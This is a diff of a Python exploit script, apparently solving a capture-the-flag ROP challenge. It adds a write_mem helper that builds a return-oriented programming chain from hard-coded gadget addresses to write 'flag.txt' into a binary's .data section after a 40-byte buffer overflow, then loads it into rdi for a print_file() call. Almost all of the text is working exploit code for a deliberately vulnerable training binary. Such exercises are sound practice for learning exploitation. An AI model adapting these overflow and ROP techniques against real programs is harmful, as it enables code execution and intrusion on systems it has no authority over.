@@ -24,19 +24,49 @@ Passage de l'argument à print_file()
     0x400693: pop rdi; ret;
 """
 
+"""
+return a ropchain (bytesarray) that write the bytestring at
+the given address.
+Will be padded with '\x00' to reach a multiple of 8
+"""
+def write_mem(address, bytestring):
+    
+    
+    # pad the bytestring to a multiple of 8
+    if (len(bytestring) % 8 != 0):
+        pad_length = len(bytestring) + (8 - len(bytestring) % 8) 
+
+        bytestring = bytestring.ljust(pad_length, b'\x00')
+        print (len(bytestring))
+
+    ropchain = b''
+
+    # write the bytestring in memory
+    # 8 bytes at a time
+    for i in range(0, int(len(bytestring) / 8)):
+        ropchain += p64(0x0400690) # pop r14,15
+        ropchain += p64(address + i * 8)
+        ropchain += bytestring[i*8:(i+1)*8]
+
+        ropchain += p64(0x0400628) # mov ptr[r14], r15
+
+    return ropchain
 
 buf  = b'A' * 40
 
-# setup /bin/sh
-# we write "/bin/sh" in $r15
-buf += p64(0x0400690) # pop r14,r15
-buf += p64(0x601028)
-buf += b'flag.txt'
+buf += write_mem(0x601028, b'flag.txt')
 
-# write /bin/sh in .data section
-buf += p64(0x0400628) # mov ptr[r14], r15
+# setup flag.txt at 0x601028
+# we write "flag.txt" in $r15
+# buf += p64(0x0400690) # pop r14,r15
+# buf += p64(0x601028)
+# buf += b'flag.txt'
 
-# point $rdi to "/bin/sh"
+# # write in .data section with mov gadget
+# buf += p64(0x0400628) # mov ptr[r14], r15
+
+
+# point $rdi to "flag.txt"
 buf += p64(0x400693) # pop rdi
 buf += p64(0x601028)
 
